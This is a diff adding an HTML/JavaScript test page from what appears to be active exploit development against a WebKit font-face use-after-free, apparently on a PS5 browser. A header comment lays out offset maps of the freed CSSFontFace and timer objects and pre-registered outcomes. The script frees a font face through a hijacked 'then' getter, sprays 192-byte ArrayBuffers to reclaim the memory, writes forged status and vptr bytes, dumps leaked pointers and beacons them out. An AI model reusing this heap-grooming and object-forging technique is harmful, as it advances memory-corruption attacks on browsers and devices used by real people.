@@ -1,0 +1,344 @@
+<!--
+  p689: +0x82-vs-+0x94 decider — WHO is status? (timer-arm 48B verdict test)
+
+  TASK A VERDICT (source pin .wk-reference, WebKit-7616.1.27):
+    Source/WebCore/platform/Timer.h
+      :44  class TimerBase { ... :49 WEBCORE_EXPORT virtual ~TimerBase();
+      :71  virtual void fired() = 0;  => TimerBase IS polymorphic: OWN vptr
+      :96  MonotonicTime m_unalignedNextFireTime;   (double, GenericTimeMixin.h:133)
+      :97  Seconds m_repeatInterval;                (double, Seconds.h:226)
+      :99  RefPtr<ThreadTimerHeapItem> m_heapItem;  (8B)
+      :100 Ref<Thread> m_thread { Thread::current() }; (8B)
+    => sizeof(TimerBase) = 40 (0x28), timer vptr INDEPENDENT of the
+       CSSFontFace outer vptr (Sony fork dropped the OUTER one only).
+    Source/WebCore/platform/Timer.h:110  class Timer : public TimerBase
+      { ... :140 Function<void()> m_function; }  — Function.h:121
+      std::unique_ptr<Impl> m_callableWrapper = 8B.
+    CSSFontFace.cpp:105 : m_timeoutTimer(*this, &CSSFontFace::timeoutFired)
+      uses Timer's member-fn ctor (:123-127) => m_function ALWAYS allocated.
+    => sizeof(Timer) = 48 (0x30). FACE MATH: 0x90 + 0x30 = 0xC0 = 192
+       bytes EXACT — closes the last layout row. Arm 0x28 is REFUTED by
+       arithmetic alone (0x90+0x28=0xB8=184 raw, 192 class => impossible).
+
+  FACE+TIMER FIELD MAP (established rows + this session's derivation):
+    +0x90 timer.vptr              (TimerBase vtable — data .rodata)
+    +0x98 m_unalignedNextFireTime (double; 0.0 never-armed / set+defused)
+    +0xA0 m_repeatInterval        (double; 0.0 one-shot)
+    +0xA8 m_heapItem              (RefPtr, null unless armed)
+    +0xB0 m_thread                (Ref<Thread> — NONZERO always)
+    +0xB8 m_function.m_callableWrapper (unique_ptr — NONZERO always,
+             points to CallableWrapper<std::_Bind<...>> heap block:
+             vptr@+0x00, bound CSSFontFace* this @+0x08 — SELF-LEAK PATH)
+
+  WHAT THIS PROBE DECIDES (bench law cross-check):
+    +0x82 (status byte, int8 enum 0..4) vs +0x94 (timer interior under the
+           48B map: timer vptr occupies +0x90..+0x97, so +0x94 = UPPER
+           DWORD of the timer's own vptr — fire-time itself is +0x98).
+           Corollary: +0x94 seeded 0x03 => any virtual dispatch on the
+           timer jumps to 0x00000003xxxxxxxx (wild-high) — a signature
+           DISTINCT from a +0x90-null dispatch (vptr zeroed in our buffer).
+           If BOTH offsets behave identically under the load() oracle, the
+           +0x82=read-map-only hypothesis weakens; if ONLY +0x82 diverts,
+           +0x94 is inert in this path and the 48B map stands (secondary).
+
+  DESIGN: p676b-haze5 EXACT base (stable forge: clean corridor lanes 0-4,
+  haze st=4 on lanes>=5, 24x192B spray per round, ROUNDS=6, ZERO LATE
+  writes — law 6) with ONE delta per arm:
+    /p689  -> arm A: spray-time seed 0x03 at +0x82 on corridor lanes 0-4
+    /p689b -> arm B: spray-time seed 0x03 at +0x94 on corridor lanes 0-4
+  (same page, route-selected; SEED AT SPRAY TIME ONLY — never post-forge).
+  Value 0x03 chosen: not a valid Status enum (0..4 are; 3 IS TimedOut —
+  deliberate: TimedOut is the one non-terminal state that REDIRECTS the
+  pump instead of skipping (CSSFontFace.cpp:617-622 swaps timer state) —
+  maximal contrast between "status divert" and "raw timer scribble").
+
+  ORACLE: after the R0 forge stabilises (haze pattern = p676b ALIVE
+  phenotype), at 4.0s (post-LATE, still round 0) call
+    document.fonts.load('12px f0', 'test')
+  on the forged family. Then 3s outcome window. POSITIVE CONTROL planted
+  BEFORE the forge: a REAL FontFace (new FontFace + @font-face rule,
+  local(Arial), family 'ctrl') loaded by the SAME oracle call shape
+  ('12px ctrl') at 4.05s — if the control does not resolve, the load()
+  channel itself is broken on this load and outcomes (b) are discarded.
+
+  PRE-REGISTERED OUTCOMES (record BEFORE Monday, judge per load):
+    (a) A-divert / B-inert ... A: forge survives to oracle, load('12px f0')
+        never resolves (R0c pending-forever) OR page dies inside oracle
+        window; B: R0c=resolved AND end-r6 ALIVE. => +0x82 is the live
+        status byte; +0x94 not dereferenced on this path. 48B map intact.
+    (b) A=B=resolved ........ both arms resolve fast and end-r6 ALIVE with
+        control OK => BOTH offsets inert to load(); +0x82 authority
+        (established) must then be coming from a DIFFERENT code path than
+        load() (matching/purge, not the promise pump) — split oracle next
+        (p691: delete()-oracle instead of load()-oracle).
+    (c) A=B=die in oracle window (after control OK, forge beacons present)
+        => load() dereferenced BOTH seeded regions. Under the 48B map, B
+        deaths carry a virtual-dispatch signature (vptr-hi clobbered =>
+        wild dispatch ~0x00000003xxxxxxxx at the first virtual timer call
+        — near-immediate); A deaths are promise-side. DIFFERENT death
+        signatures (B immediate/immediate-offset, A promise-side) = map
+        CONFIRMED by contradiction-test; identical signatures = ambiguous,
+        graduate +0x94 to a dedicated dt probe (p691).
+    (d) control FAILS (ctrl not resolved) => load() channel dead this load;
+        no verdict, discard load, count occurrence (if 2+/3 loads: the PS5
+        font-load timing override is intercepting — switch oracle to
+        FontFaceSet.check() + visible-text swap screenshot instead).
+  HONEST CONFOUND NOTE: seeding 0x03 at +0x94 ALSO writes bytes that under
+  arm-40B would be padding — outcome (a) cannot distinguish 40B-vs-48B;
+  it validates the +0x82 semantic map only. The 48B verdict rests on
+  source arithmetic (0xC0) which (a)/(b)/(c) can only CONTRADICT (via a B
+  death signature), never further confirm. This is stated so nobody
+  over-claims Monday.
+
+  Beacon: P689-.  CRASH_CLASS: MEDIUM (oracle window only; forge base is
+  the known-stable p676b phenotype).
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p689</title></head>
+<body>p689: +0x82-vs-+0x94 decider (arm A default, /p689b=arm B, r6)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+}
+function flush() {
+  while (bQ.length) {
+    var b = bQ.splice(0, 2).join('|');
+    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P689-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+/* route selects the arm: /p689 = A (+0x82), /p689b = B (+0x94) */
+var ARM = 'A', SEEDOFF = 0x82;
+try {
+  if (location.pathname.indexOf('p689b') !== -1) { ARM = 'B'; SEEDOFF = 0x94; }
+} catch(e) {}
+
+var TARGET = 1;
+emit('START', 'decider8294 arm=' + ARM + ' off=' + SEEDOFF.toString(16) + ' r6');
+flush();
+
+var ROUNDS = 6;
+var round = 0;
+var results = [];
+var gfired = -1;
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+window.__sprayAlive = [];
+window.__facesAlive = [];
+var snap1 = null;
+
+var round0Lane = null;
+var round0T = '';
+var hitLanes = [];
+
+/* ---------- POSITIVE CONTROL (planted BEFORE forge; resolves normally) */
+var ctrlSty = document.createElement('style');
+ctrlSty.textContent = "@font-face { font-family: ctrl; src: local(Arial); }";
+document.head.appendChild(ctrlSty);
+var ctrlFf = new FontFace('ctrlx', 'local(Helvetica)', {});
+try { document.fonts.add(ctrlFf); } catch(e) {}
+window.__facesAlive.push(ctrlFf);
+var ctrlState = 'wait';
+try { ctrlFf.loaded.then(function() { ctrlState = 'ok'; }, function() { ctrlState = 'err'; }); } catch(e) {}
+
+function seedLane(dv, i) {
+  /* round/lane-tagged float marker @+0x44 (m_sizeAdjust, data-only) */
+  dv.setFloat32(0x44, 100 + round + i * 0.001, true);
+  /* corridor lanes 0-4: arm seed 0x03 at the arm offset (SPRAY-TIME ONLY) */
+  if (i < 5) dv.setUint8(SEEDOFF, 0x03);
+  /* haze: st=4 at +0x82 on lanes >= 5 (p676b stable-forge pattern) */
+  if (i >= 5) dv.setUint8(0x82, 4);
+}
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    gfired = round;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = window.__sprayAlive[round] = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      seedLane(dv, i);
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function dumpLane(dv) {
+  var out = [];
+  for (var off = 0; off <= 0xB8; off += 8) {
+    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
+    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
+  }
+  return out.join(',');
+}
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+function groomMap() {
+  for (var r = 0; r <= round && r < window.__sprayAlive.length; r++) {
+    var lanes = window.__sprayAlive[r];
+    if (!lanes) continue;
+    for (var i = 0; i < lanes.length; i++) {
+      var dv = lanes[i];
+      var lo = dv.getUint32(0x58, true), hi = dv.getUint32(0x5C, true);
+      if (lo !== 0 || hi !== 0) {
+        emit('LANE r' + round, 'owner=r' + r + ' lane=' + i +
+             ' seed=' + dv.getFloat32(0x44, true).toFixed(3) +
+             ' T=' + hex32(hi) + hex32(lo) +
+             ' rc=' + dv.getUint32(0x00, true) +
+             ' st=' + dv.getUint8(0x82));
+      }
+    }
+  }
+}
+
+function obsR0Lane() {
+  if (!round0Lane) return;
+  try {
+    var tNow = hex32(round0Lane.getUint32(0x5C, true)) + hex32(round0Lane.getUint32(0x58, true));
+    emit('OBS r' + round, 'opc=' + round0Lane.getUint32(0x60, true) +
+         ' rc=' + round0Lane.getUint32(0x00, true) +
+         ' st=' + round0Lane.getUint8(0x82) +
+         ' seed' + SEEDOFF.toString(16) + '=' + round0Lane.getUint8(SEEDOFF) +
+         ' Tsame=' + (tNow === round0T ? 'y' : 'n'));
+  } catch(e) { emit('OBS r' + round, 'ERR ' + String(e).slice(0,60)); }
+}
+
+function trackHit(hit) {
+  var dv = spray[hit];
+  if (round === 0) round0Lane = dv;
+  hitLanes.push({ tag: 'r' + round, dv: dv });
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive.push(ff);
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeEarly, 150);
+  setTimeout(analyzeLate, 3500);
+}
+
+function analyzeEarly() {
+  try {
+    obsR0Lane();
+    var hit = scanHit();
+    if (hit < 0) {
+      emit('R' + round, 'MISS gf=' + gfired);
+      results.push({ r: round, lane: -1, t: '-', w: '-' });
+    } else {
+      var dv = spray[hit];
+      snap1 = dumpLane(dv);
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
+      if (round === 0) round0T = hex32(tHi) + hex32(tLo);
+      trackHit(hit);
+      emit('R' + round, 'hit=' + hit + (hit === TARGET ? ' TARGET' : ' NON-TARGET') +
+           ' T=' + hex32(tHi) + hex32(tLo) +
+           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
+           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
+           ' seed' + SEEDOFF.toString(16) + '=' + dv.getUint8(SEEDOFF) +
+           ' gf=' + gfired +
+           ' seed44=' + dv.getFloat32(0x44, true).toFixed(3));
+      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
+    }
+    groomMap();
+    flush();
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+/* ---------- ORACLE (fires once, after R0 stabilised) ---------- */
+var oracleFired = false, oracleState = 'none';
+function fireOracle() {
+  if (oracleFired) return;
+  oracleFired = true;
+  oracleState = 'fired';
+  emit('ORACLE', 'ctl=' + ctrlState + ' arming load() pair');
+  try { document.fonts.load('12px ctrl', 'test'); } catch(e) {}
+  try {
+    document.fonts.load('12px f0', 'test').then(
+      function() { oracleState = 'resolved'; emit('R0c', 'resolved'); flush(); },
+      function(er) { oracleState = 'rejected'; emit('R0c', 'rejected ' + String(er).slice(0,60)); flush(); }
+    );
+  } catch(e) { oracleState = 'threw'; emit('R0c', 'threw ' + String(e).slice(0,60)); flush(); return; }
+  emit('R0c', 'pending');
+  flush();
+  setTimeout(function() {
+    if (oracleState === 'fired') { oracleState = 'skipped'; emit('R0c', 'skipped (pending>3s)'); flush(); }
+  }, 3000);
+}
+
+function analyzeLate() {
+  try {
+    obsR0Lane();
+    var hit = scanHit();
+    if (hit >= 0 && spray.length) {
+      var dv = spray[hit];
+      var snap2s = dumpLane(dv);
+      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
+           ' rc=' + dv.getUint32(0x00, true) +
+           ' seed' + SEEDOFF.toString(16) + '=' + dv.getUint8(SEEDOFF) +
+           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
+      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
+    } else {
+      emit('R' + round + 'LATE', 'alive (miss-round)');
+    }
+    flush();
+    /* oracle after R0-LATE only: forge had 3.5s to settle */
+    if (round === 0) { setTimeout(fireOracle, 500); }
+    round++;
+    if (round < ROUNDS) {
+      gfired = -1;
+      setTimeout(beginRound, (round === 1) ? 3500 : 250);
+    } else {
+      var ts = {}, lanes = [];
+      for (var k = 0; k < results.length; k++) {
+        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
+        lanes.push(results[k].lane);
+      }
+      var keys = Object.keys(ts);
+      emit('SUMMARY', 'decider arm=' + ARM + ' rounds=' + results.length +
+           ' kept=' + window.__sprayAlive.length +
+           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
+      emit('CTLFIN', 'ctl=' + ctrlState + ' oracle=' + oracleState);
+      emit('ALIVE', 'end-r6-decider-' + ARM);
+      flush();
+    }
+  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
